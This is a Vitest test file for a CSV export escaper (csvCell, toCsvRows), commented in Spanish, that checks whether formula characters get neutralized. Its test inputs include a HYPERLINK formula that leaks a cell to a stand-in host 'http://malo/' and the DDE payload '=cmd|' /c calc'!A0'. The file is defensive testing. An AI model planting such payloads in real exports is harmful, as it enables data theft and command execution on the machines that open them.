import { describe, expect, it } from "vitest";
import { csvCell, toCsvRows } from "@conversia/types";

/**
 * §10.5 — CSV injection.
 *
 * Excel y Google Sheets evalúan como FÓRMULA cualquier celda que empiece con `=`, `+`,
 * `-`, `@`, tabulador o retorno de carro. Lo que va en estos exports son nombres, mensajes
 * y conceptos escritos por CONTACTOS —gente de fuera—, así que un nombre como
 * `=HYPERLINK("http://malo/?"&A1,"Haz clic")` se vuelve un enlace vivo al abrir el archivo
 * en el computador del dueño. Había cuatro copias del escape y ninguna lo neutralizaba.
 */
describe("§10.5 — las fórmulas se neutralizan", () => {
  const empiezaComoTexto = (celda: string) => /^"'/.test(celda);

  it("neutraliza los cinco caracteres que disparan una fórmula", () => {
    for (const malo of ["=1+1", "+1", "-1", "@SUM(A1)", "\tcosa", "\rcosa"]) {
      const out = csvCell(malo);
      expect(empiezaComoTexto(out), `${JSON.stringify(malo)} → ${out}`).toBe(true);
    }
  });

  it("el ataque real (HYPERLINK) sale como texto, no como enlace", () => {
    const out = csvCell('=HYPERLINK("http://malo/?"&A1,"Haz clic")');
    expect(out.startsWith("\"'=HYPERLINK")).toBe(true);
    // Y las comillas internas quedan escapadas, así que no rompe la columna.
    expect(out.endsWith('"')).toBe(true);
    expect(out).toContain('""http://malo/?""');
  });

  it("también el clásico de ejecución de comandos", () => {
    expect(empiezaComoTexto(csvCell("=cmd|' /c calc'!A0"))).toBe(true);
  });

  it("un valor normal NO se toca (el CSV sigue siendo legible)", () => {
    expect(csvCell("Ana Pérez")).toBe("Ana Pérez");
    expect(csvCell("+56912345678".replace("+", ""))).toBe("56912345678");
    expect(csvCell(12345)).toBe("12345");
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell("")).toBe("");
  });

  it("un teléfono escrito con + SÍ se neutraliza (es el precio de estar seguro)", () => {
    // Un `+56 9…` empieza con `+`, así que Excel lo trataría como fórmula. Se prefija.
    expect(empiezaComoTexto(csvCell("+56 9 1234 5678"))).toBe(true);
  });

  it("sigue escapando comillas y separadores como antes", () => {
    expect(csvCell('dice "hola"')).toBe('"dice ""hola"""');
    expect(csvCell("uno,dos")).toBe('"uno,dos"');
    expect(csvCell("uno;dos")).toBe('"uno;dos"');
    expect(csvCell("dos\nlineas")).toBe('"dos\nlineas"');
  });

  it("toCsvRows aplica el escape a TODAS las celdas, cabecera incluida", () => {
    const csv = toCsvRows(["nombre", "nota"], [["=1+1", "ok"]]);
    const [cabecera, fila] = csv.split("\n");
    expect(cabecera).toBe("nombre,nota");
    expect(fila.startsWith("\"'=1+1\"")).toBe(true);
  });
});
